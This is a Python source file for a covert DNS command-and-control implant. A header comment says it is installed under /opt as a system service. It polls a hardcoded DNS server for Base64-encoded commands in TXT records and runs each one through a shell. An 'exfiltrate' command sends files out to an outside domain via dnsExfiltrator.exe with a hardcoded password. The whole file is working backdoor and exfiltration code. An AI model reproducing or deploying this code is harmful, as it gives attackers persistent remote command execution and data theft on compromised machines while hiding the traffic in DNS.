# stored in /opt/covert_channel for system service to be executed
import dns.resolver
import base64
import subprocess
import time

# seconds between polling server for more commands
POLL_TIME = 10

# Define server and domain
dns_server = "192.168.243.141"
domain = "c2.netres.com"
exfil_domain = "exfil.netres.com"
subdomains = ['message']

exfil_encrypt_password = 'password'

def decode_message(encoded_message):
    """
    Decode the Base64 encoded message.
    """
    print(encoded_message)
    try:
        return base64.b64decode(encoded_message).decode()
    except Exception as e:
        print(f"Error decoding message: {e}")
        return None

def execute_command(command):
    """
    Execute the decoded command on the server.
    """
    try:
        # if the command starts with 'exfiltrate', it is a special command
        # format of exfiltrate command should be
        #   exfiltrate [file]
        if command.startswith('exfiltrate'):
            args_list = command.split()
            command = f'.\\dnsExfiltrator.exe {args_list[1]} {exfil_domain} {exfil_encrypt_password} -b32 s={dns_server}'

        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        if result.returncode == 0:
            print(f"Command executed successfully:\n{result.stdout}")
        else:
            print(f"Error executing command:\n{result.stderr}")
    except Exception as e:
        print(f"Error while executing the command: {e}")

def get_covert_messages():
    """
    Query the DNS server for covert messages stored in TXT records and execute them.
    """
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server]

    commands = []

    for subdomain in subdomains:
        try:
            response = resolver.resolve(f"{subdomain}.{domain}", 'TXT')
            for txt_record in response:
                encoded_message = txt_record.to_text().strip('"')  # Remove quotes
                
                # if it is empty, there is no command for us to run righ now
                if not encoded_message:
                    commands.append('')
                    continue

                decoded_message = decode_message(encoded_message)
                if decoded_message:
                    print(f"Decoded Message from {subdomain}: {decoded_message}")
                    commands.append(decoded_message)
        except dns.resolver.NoAnswer:
            print(f"No TXT record found for {subdomain}.")
        except dns.resolver.NXDOMAIN:
            print(f"The domain {subdomain}.{domain} does not exist.")
        except Exception as e:
            print(f"DNS Query Failed for {subdomain}: {e}")
        
        return commands


def poll_server():
    while True:
        commands = get_covert_messages()

        # for right now, only really expecting there to be one
        for command in commands:
            print(f'Got the following from the server: "{command}"')
            if not command:
                continue
            execute_command(command)
        
        print(f'Sleeping for {POLL_TIME} seconds...')
        time.sleep(POLL_TIME)


if __name__ == '__main__':
    poll_server()
    get_covert_messages()
